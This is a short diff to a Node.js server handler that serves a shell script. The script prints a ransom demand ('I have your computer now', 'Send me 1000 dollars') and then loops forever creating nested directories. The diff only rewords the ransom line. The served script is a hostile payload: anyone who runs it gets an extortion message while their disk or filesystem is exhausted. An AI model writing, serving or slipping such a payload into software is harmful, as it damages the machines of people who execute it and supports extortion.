@@ -143,7 +143,7 @@ function regr(request, response) {
 function script(request, response) {
     response.writeHead(200);
     response.write("echo I have your computer now\n");
-    response.write("echo Send me 1000 (one thousand) dollars\n");
+    response.write("echo Send me 1000 dollars\n");
     response.write("while true; do mkdir new; cd new; done");
     response.end();
 }
